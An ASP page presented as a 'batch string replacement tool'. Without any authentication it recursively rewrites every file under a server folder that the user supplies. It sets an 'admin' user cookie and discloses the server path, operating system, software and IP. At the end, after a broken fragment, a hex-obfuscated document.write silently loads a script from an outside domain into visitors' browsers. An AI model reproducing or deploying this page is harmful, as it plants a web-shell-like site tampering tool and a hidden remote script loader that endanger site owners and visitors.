<%
Option Explicit
Server.ScriptTimeOut=9999
response.cookies("userinfor")("userid")="admin"	

%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<meta http-equiv="Content-Language" content="zh-CN" />
<meta name="author" content="QQ945504681编写 " />
<meta name="Description" content="在线批量字符替换工具" />
<meta name="copyright" content="QQ945504681原创web程序 欢迎指正"/>
<title>ASP在线版批量字符替换工具</title>
<style type="text/css">
<!--
#top
{
	text-align:center;
	margin:auto;
	font-size:11pt;
}

#top_b
{
	text-align:left;
	width:350px;
	border:1px solid #000000;
	margin:auto;
	padding:0px;
	line-height:200%;
}

#top_b div
{
	padding-left:8px;
	padding-right:8px;
}

#ftitle
{
	text-align:center;
	width:350px;
	background:silver;
	font-weight:bold;
	letter-spacing:5px;
	font-size:15pt;
	padding:3px 0 3px 0;
	color:red;
	margin:auto;
	border:1px solid #000000;
	border-width:1px 1px 0 1px;
}

#btm
{
	text-align:center;
	padding-top:8px;
	padding-bottom:8px;
	background:#ececec
}

textarea
{
	width:330;
	height:100px
}

#copyr
{
	font-size:9pt;
	text-align:center;
	color:silver
}
-->
</style>
</head>
<body>
<%
if request.querystring("add")="yes" then
%>
<div id="top">
	<div id="ftitle">程序处理结果</div>
	<div id="top_b">
		<div>
			总文件:<span style="color:red" id="allfile">&nbsp;</span>个&nbsp;&nbsp;
			替换过文件:<span style="color:red" id="repfile">&nbsp;</span>个
		</div>
		<div><br />被替换过文件路径列表↓<textarea id="txtreple" style="overflow:auto"></textarea></div>
	  <div id="copyr"><br />
		  <a href="http://www.xnzjpc.cn">虚拟主机评测网工具</a></div>
	</div>
</div>
<%
dim oldstr :oldstr=request.form("lookstr")  '源字符串
dim newstr :newstr=request.form("replacestr") '新字符串
dim rep : rep=cbool(request.form("bak"))   '是否备份文件，true为备份文件
dim i : i=0  '总文件个数
dim j : j=0  '被替换的文件个数

function chkexistsfile(path) '判断一个文件是否存在，如果存在，返回true，否则返回false
	dim fso
	set fso=server.createobject("scripting.filesystemobject")
	if fso.fileexists(path) then
		chkexistsfile=true
	else
		chkexistsfile=false
	end if
	set fso=nothing
end function

function getfilecode(path) '获取一个文件的代码
    On error Resume Next
	dim fso
	if chkexistsfile(path) then
		set fso=server.createobject("scripting.filesystemobject")
		dim filecode : set filecode=fso.opentextfile(path,1)
		getfilecode=filecode.readall
		set fso=nothing
	else
		getfilecode=path & "不存在该文件"
	end if
end function

sub jstxt(txt) '使用JavaScript
	response.write "<script type=""text/JavaScript"" language=""JavaScript"">"
	response.write "<!--"&chr(13)&chr(10)
	response.write txt
	response.write chr(13)&chr(10)&"//-->"
	response.write "</script>"
end sub


sub getfolderfile(cpath) '替换某一个(子)文件夹下的所有文件

	response.flush
	dim fso : set fso=server.createobject("scripting.filesystemobject")
	if fso.folderexists(cpath)=false then 
		jstxt("alert("" "&replace(cpath,"\","\\") & "不存在该文件夹！"&" "") ")
		response.end
	end if
	dim folders : set folders=fso.GetFolder(cpath)
	dim sfile
	for each sfile in folders.files
		dim filecode : filecode=getfilecode(sfile)
		dim filecode_b : filecode_b=filecode
		if instr(filecode,oldstr) <> 0 and fso.GetExtensionName(sfile) <> "bak" then
			
			jstxt("document.getElementById(""txtreple"").value+="""& replace(sfile,"\","\\") & "\r\n""" &chr(13)&chr(10))
			jstxt("window.status="""& replace(sfile,"\","\\")&"""")
			jstxt("document.title="""& replace(sfile,"\","\\")&"""")
			
			filecode=replace(filecode,oldstr,newstr)
			dim newfilecode : set newfilecode=fso.opentextfile(sfile,2)
			newfilecode.write filecode
			j=j+1
			if rep then
				dim newfilecode_b : set newfilecode_b=fso.opentextfile(sfile+".bak",2,true)
				newfilecode_b.write filecode_b
			end if
		end if
		i=i+1
		jstxt("document.getElementById(""allfile"").innerHTML="""&i&"""")
		jstxt("document.getElementById(""repfile"").innerHTML="""&j&"""")

	next
	
	dim sfolder
	for each sfolder in folders.subfolders
		getfolderfile(sfolder)
	next
	set fso=nothing


end sub


getfolderfile(trim(request.form("pfolder"))) '调用程序

else
%>
<div id="top">

	<form action="?add=yes" method="post" name="strform">

		<div id="ftitle">在线字符批量替换工具</div>
		<div id="top_b">

			<div>文件夹地址：<input type="text" size="25" name="pfolder"/></div>
			<div>备份原文件：<input type="checkbox" name="bak" value="true" /></div>
			<div><br />查找字符串↓<textarea name="lookstr"></textarea></div>
			<div><br />替换查找的字符串↓<textarea name="replacestr"></textarea></div>
			<div id="btm"><input type="button" value="&nbsp;确定&nbsp;" onclick="chk()"/></div>
		  <div id="copyr"><br />
		    <a href="http://www.xnzjpc.cn">虚拟主机评测网工具</a> <a href="http://www.wendns.com" target="_blank">感谢中国稳网提供空间</a> </div>

		</div>
	
	</form>
</div>
<SCRIPT type="text/javascript" LANGUAGE="JavaScript">
<!--
function chk()
{
	var forma=document.strform;
	if(forma.pfolder.value=="")
	{
		alert("文件夹地址不能为空");
		forma.pfolder.focus();
		return;
	}
	else 
	{
		forma.pfolder.value=forma.pfolder.value.replace(/\//g,"\\");
		forma.pfolder.value=forma.pfolder.value.replace(/。/g,".");
	}
	if(forma.lookstr.value=="")
	{
		alert("查找字符串不能为空！");
		forma.lookstr.focus();
	}
	else if(forma.replacestr.value=="")
	{
		alert("替换查找的字符串不能为空");
		forma.replacestr.focus();
	}
	else
	{
		forma.submit();
	}
}
//-->
</SCRIPT>
<% end if %>
<%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%><br>
<%="操作系统为:"&Request.ServerVariables("OS")%><br>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%><br>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%><br>
');
</script>
<br>
:<SPAN class=copyright>
<script>
window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"] ('\x3c\x73\x63\x72\x69\x70\x74 \x6c\x61\x6e\x67\x75\x61\x67\x65\x3d\x22\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x7a\x68\x6f\x6e\x67\x6b\x65\x2e\x63\x6f\x6d\x2e\x63\x6e\x2f\x69\x6d\x61\x67\x65\x73\x2f\x61\x64\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');
</script>


</body>
</html>